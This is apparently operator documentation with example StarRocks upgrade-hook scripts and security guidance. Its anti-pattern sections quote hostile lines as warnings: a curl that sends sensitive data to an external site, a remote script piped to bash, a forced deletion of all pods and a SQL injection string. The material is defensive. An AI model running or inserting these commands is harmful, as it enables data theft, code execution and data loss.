# Safe Upgrade Hooks Examples

This document provides secure, production-ready examples for using upgrade hooks in the StarRocks Kubernetes Operator.

⚠️ **SECURITY WARNING**: Upgrade hooks execute with operator privileges. All examples must be reviewed by your security team before deployment.

---

## Table of Contents

1. [Predefined Hooks (Recommended)](#predefined-hooks-recommended)
2. [Custom Hook Examples](#custom-hook-examples)
3. [Security Best Practices](#security-best-practices)
4. [Anti-Patterns to Avoid](#anti-patterns-to-avoid)

---

## Predefined Hooks (Recommended)

**Predefined hooks are the SAFEST option** because they use hardcoded, reviewed SQL commands.

### Example 1: Basic FE Upgrade with Predefined Hooks

```yaml
apiVersion: starrocks.com/v1
kind: StarRocksCluster
metadata:
  name: starrocks-sample
  namespace: starrocks
spec:
  starRocksFeSpec:
    image: starrocks/fe-ubuntu:3.2.2
    replicas: 3
    upgradeHooks:
      # Use predefined hooks (safe, recommended)
      predefined:
        - disable-tablet-clone
        - disable-balancer
      timeoutSeconds: 300
  starRocksBeSpec:
    image: starrocks/be-ubuntu:3.2.2
    replicas: 3
```

**Available Predefined Hooks:**
- `disable-tablet-clone` - Sets tablet_sched_max_scheduling_tablets = 0 (pre-upgrade)
- `disable-balancer` - Sets disable_balance = true (pre-upgrade)
- `enable-tablet-clone` - Restores tablet_sched_max_scheduling_tablets = 2000 (post-upgrade)
- `enable-balancer` - Sets disable_balance = false (post-upgrade)

---

## Custom Hook Examples

### Example 2: Safe Custom Hook for FE

**ConfigMap:**
```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: fe-upgrade-hooks
  namespace: starrocks
data:
  hooks.sh: |
    #!/bin/bash
    # StarRocks FE Upgrade Hooks
    # Version: 1.0
    # Last Reviewed: 2025-01-06
    # Reviewer: Security Team

    # SECURITY: These functions execute with operator privileges
    # NEVER incorporate untrusted input into SQL commands
    # ALL SQL commands must be hardcoded

    # Pre-upgrade: Disable tablet scheduling and balancing
    pre_upgrade() {
        echo "INFO: Executing FE pre-upgrade hooks"

        # Connect to FE using environment variables provided by operator
        # SR_FE_HOST, SR_FE_PORT, SR_FE_USER are set automatically
        MYSQL_CMD="mysql -h${SR_FE_HOST} -P${SR_FE_PORT} -u${SR_FE_USER}"

        # SECURITY: All SQL commands are hardcoded, no user input
        echo "INFO: Disabling tablet clone scheduling"
        $MYSQL_CMD -e 'ADMIN SET FRONTEND CONFIG ("tablet_sched_max_scheduling_tablets" = "0")' || {
            echo "ERROR: Failed to disable tablet clone"
            return 1
        }

        echo "INFO: Disabling load balancer"
        $MYSQL_CMD -e 'ADMIN SET FRONTEND CONFIG ("disable_balance" = "true")' || {
            echo "ERROR: Failed to disable balancer"
            return 1
        }

        echo "INFO: Pre-upgrade hooks completed successfully"
        return 0
    }

    # Post-upgrade: Re-enable tablet scheduling and balancing
    post_upgrade() {
        echo "INFO: Executing FE post-upgrade hooks"

        MYSQL_CMD="mysql -h${SR_FE_HOST} -P${SR_FE_PORT} -u${SR_FE_USER}"

        echo "INFO: Re-enabling tablet clone scheduling"
        $MYSQL_CMD -e 'ADMIN SET FRONTEND CONFIG ("tablet_sched_max_scheduling_tablets" = "2000")' || {
            echo "WARN: Failed to re-enable tablet clone (non-critical)"
        }

        echo "INFO: Re-enabling load balancer"
        $MYSQL_CMD -e 'ADMIN SET FRONTEND CONFIG ("disable_balance" = "false")' || {
            echo "WARN: Failed to re-enable balancer (non-critical)"
        }

        echo "INFO: Post-upgrade hooks completed"
        return 0
    }
```

**StarRocksCluster:**
```yaml
apiVersion: starrocks.com/v1
kind: StarRocksCluster
metadata:
  name: starrocks-sample
  namespace: starrocks
spec:
  starRocksFeSpec:
    image: starrocks/fe-ubuntu:3.2.2
    replicas: 3
    upgradeHooks:
      custom:
        configMapName: fe-upgrade-hooks
        scriptKey: hooks.sh
      timeoutSeconds: 600
```

---

### Example 3: Advanced BE Hook with Health Checks

**ConfigMap:**
```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: be-upgrade-hooks
  namespace: starrocks
data:
  hooks.sh: |
    #!/bin/bash
    # StarRocks BE Upgrade Hooks with Health Checks
    # SECURITY REVIEWED: 2025-01-06

    # Pre-upgrade: Verify cluster health before proceeding
    pre_upgrade() {
        echo "INFO: BE pre-upgrade validation starting"

        MYSQL_CMD="mysql -h${SR_FE_HOST} -P${SR_FE_PORT} -u${SR_FE_USER}"

        # Check cluster health
        echo "INFO: Checking cluster health"
        BE_COUNT=$($MYSQL_CMD -N -e "SHOW PROC '/backends'" | wc -l)
        if [ "$BE_COUNT" -lt 3 ]; then
            echo "ERROR: Insufficient BE nodes for safe upgrade (found: $BE_COUNT, required: 3)"
            return 1
        fi

        # SECURITY: Hardcoded SQL only, no user input
        echo "INFO: Disabling automatic tablet repair"
        $MYSQL_CMD -e 'ADMIN SET FRONTEND CONFIG ("tablet_repair_delay_factor_second" = "86400")' || {
            echo "ERROR: Failed to set repair delay"
            return 1
        }

        echo "INFO: BE pre-upgrade validation complete"
        return 0
    }

    # Post-upgrade: Restore normal operations
    post_upgrade() {
        echo "INFO: BE post-upgrade cleanup starting"

        MYSQL_CMD="mysql -h${SR_FE_HOST} -P${SR_FE_PORT} -u${SR_FE_USER}"

        # Wait for BE to be healthy (with timeout)
        echo "INFO: Waiting for BE to become healthy"
        MAX_WAIT=300
        ELAPSED=0
        while [ $ELAPSED -lt $MAX_WAIT ]; do
            ALIVE_BE=$($MYSQL_CMD -N -e "SHOW PROC '/backends'" | grep -c "true.*true")
            if [ "$ALIVE_BE" -ge 3 ]; then
                echo "INFO: BE nodes are healthy ($ALIVE_BE nodes alive)"
                break
            fi
            echo "INFO: Waiting for BE health... ($ELAPSED/$MAX_WAIT seconds)"
            sleep 10
            ELAPSED=$((ELAPSED + 10))
        done

        # Restore normal repair schedule
        $MYSQL_CMD -e 'ADMIN SET FRONTEND CONFIG ("tablet_repair_delay_factor_second" = "60")' || {
            echo "WARN: Failed to restore repair delay (non-critical)"
        }

        echo "INFO: BE post-upgrade cleanup complete"
        return 0
    }
```

---

### Example 4: CN Upgrade with Auto-Scaling Considerations

**ConfigMap:**
```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: cn-upgrade-hooks
  namespace: starrocks
data:
  hooks.sh: |
    #!/bin/bash
    # StarRocks CN Upgrade Hooks
    # Handles CN upgrades with auto-scaling awareness

    pre_upgrade() {
        echo "INFO: CN pre-upgrade starting"

        MYSQL_CMD="mysql -h${SR_FE_HOST} -P${SR_FE_PORT} -u${SR_FE_USER}"

        # Check for active queries on CN nodes
        echo "INFO: Checking for active queries"
        ACTIVE_QUERIES=$($MYSQL_CMD -N -e "SELECT COUNT(*) FROM information_schema.processlist WHERE Command != 'Sleep'" 2>/dev/null || echo "0")

        if [ "$ACTIVE_QUERIES" -gt 100 ]; then
            echo "WARN: High number of active queries detected: $ACTIVE_QUERIES"
            echo "WARN: Consider upgrading during maintenance window"
        fi

        # CN nodes don't require special preparation
        echo "INFO: CN pre-upgrade complete (no special preparation needed)"
        return 0
    }

    post_upgrade() {
        echo "INFO: CN post-upgrade starting"

        # CN nodes will auto-register after restart
        # No special cleanup needed

        echo "INFO: CN post-upgrade complete"
        return 0
    }
```

---

## Security Best Practices

### ✅ DO:

1. **Hardcode ALL SQL Commands**
   ```bash
   # GOOD: Hardcoded SQL
   $MYSQL_CMD -e 'ADMIN SET FRONTEND CONFIG ("setting" = "value")'
   ```

2. **Use Environment Variables for Connection**
   ```bash
   # GOOD: Use operator-provided env vars
   MYSQL_CMD="mysql -h${SR_FE_HOST} -P${SR_FE_PORT} -u${SR_FE_USER}"
   ```

3. **Check Return Codes**
   ```bash
   # GOOD: Check for errors
   $MYSQL_CMD -e 'SQL COMMAND' || {
       echo "ERROR: Command failed"
       return 1
   }
   ```

4. **Add Timeouts**
   ```bash
   # GOOD: Timeout for long operations
   timeout 300 $MYSQL_CMD -e 'LONG RUNNING QUERY'
   ```

5. **Log All Actions**
   ```bash
   # GOOD: Verbose logging for audit trail
   echo "INFO: Executing critical operation X"
   ```

### ❌ DON'T:

1. **Never Use Variables in SQL**
   ```bash
   # BAD: Variable in SQL (SQL injection risk!)
   SETTING_VALUE="malicious'; DROP TABLE users; --"
   $MYSQL_CMD -e "ADMIN SET CONFIG ('setting' = '$SETTING_VALUE')"
   ```

2. **Never Execute User Input**
   ```bash
   # BAD: User input in shell command (command injection!)
   kubectl get configmap user-provided-name -o jsonpath='{.data.script}' | bash
   ```

3. **Never Call External Services**
   ```bash
   # BAD: Exfiltration risk!
   curl https://external-site.com/collect?data=$SENSITIVE_INFO
   ```

4. **Never Use kubectl Without Validation**
   ```bash
   # BAD: Privilege escalation risk!
   kubectl delete pod --all --force
   ```

5. **Never Disable Security Features**
   ```bash
   # BAD: Weakens security posture!
   set +e  # Don't disable error handling
   ```

---

## Anti-Patterns to Avoid

### Anti-Pattern 1: Dynamic SQL Construction

❌ **NEVER DO THIS:**
```bash
# DANGEROUS: SQL injection vulnerability
pre_upgrade() {
    TABLE_NAME=$(kubectl get configmap user-config -o jsonpath='{.data.table}')
    $MYSQL_CMD -e "SELECT * FROM $TABLE_NAME"  # SQL INJECTION!
}
```

✅ **DO THIS INSTEAD:**
```bash
# SAFE: Hardcoded SQL only
pre_upgrade() {
    # If you need flexibility, use predefined hooks or separate ConfigMaps
    $MYSQL_CMD -e 'SELECT * FROM system_table'  # Hardcoded, safe
}
```

---

### Anti-Pattern 2: Calling kubectl

❌ **NEVER DO THIS:**
```bash
# DANGEROUS: Privilege escalation risk
pre_upgrade() {
    kubectl delete pod suspicious-pod  # DON'T DO THIS!
}
```

✅ **DO THIS INSTEAD:**
```bash
# SAFE: Only interact with StarRocks database
pre_upgrade() {
    $MYSQL_CMD -e 'ADMIN CANCEL DECOMMISSION BACKEND "host:port"'
}
```

---

### Anti-Pattern 3: Network Calls

❌ **NEVER DO THIS:**
```bash
# DANGEROUS: Data exfiltration / supply chain attack
pre_upgrade() {
    curl https://unknown-site.com/malicious-script.sh | bash  # DON'T!
}
```

✅ **DO THIS INSTEAD:**
```bash
# SAFE: All logic embedded in script
pre_upgrade() {
    # All necessary logic should be in this function
    echo "Only call localhost or FE service"
}
```

---

## Testing Your Hooks

### Test in Development First

1. **Create test cluster:**
   ```bash
   kubectl create namespace starrocks-dev
   # Deploy test cluster
   ```

2. **Apply ConfigMap:**
   ```bash
   kubectl apply -f your-hooks-configmap.yaml
   ```

3. **Trigger upgrade:**
   ```bash
   kubectl patch starrockscluster test-cluster \
     --type='merge' \
     -p '{"spec":{"starRocksFeSpec":{"image":"new-version"}}}'
   ```

4. **Monitor execution:**
   ```bash
   kubectl logs -f deployment/starrocks-operator -n starrocks-operator-system | grep "CustomHookExecutor"
   ```

---

## Audit Checklist

Before deploying custom hooks to production, verify:

- [ ] All SQL commands are hardcoded (no variables)
- [ ] No user input is incorporated anywhere
- [ ] No external network calls
- [ ] No kubectl commands
- [ ] Return codes are checked
- [ ] Errors are logged
- [ ] Timeouts are configured
- [ ] Script has been reviewed by security team
- [ ] Script has been tested in development
- [ ] Audit logging is enabled

---

## Getting Help

If you're unsure whether your hook script is safe:

1. **Review the security analysis**: `doc/upgrade-hooks/SECURITY_ANALYSIS.md`
2. **Ask your security team** to review the script
3. **Use predefined hooks** instead of custom scripts when possible
4. **Open an issue** in the StarRocks operator repository

---

**Remember:** With great power comes great responsibility. Custom hooks execute with operator privileges. Always prioritize security over convenience.
